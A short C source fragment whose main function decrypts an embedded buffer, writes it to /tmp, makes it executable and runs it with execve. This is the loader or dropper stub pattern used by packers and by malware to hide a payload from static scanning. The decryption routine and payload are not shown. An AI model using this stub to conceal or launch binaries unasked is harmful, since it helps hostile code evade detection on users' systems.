int main(int argc, char *argv[], char *envp[]) {
    // Decrypt the data
    decrypt_buffer(encrypted_data, DATA_SIZE);

    // Write decrypted binary to temp file
    const char *temp_path = "/tmp/decrypted_binary";
    FILE *f = fopen(temp_path, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    if (fwrite(encrypted_data, 1, DATA_SIZE, f) != DATA_SIZE) {
        fprintf(stderr, "Failed to write decrypted binary\n");
        fclose(f);
        return 1;
    }
    fclose(f);

    // Make it executable
    chmod(temp_path, 0755);

    // Execute it
    char *exec_argv[] = {(char *)temp_path, NULL};
    execve(temp_path, exec_argv, envp);

    // If execve returns, it failed
    perror("execve");
    unlink(temp_path);
    return 1;
}
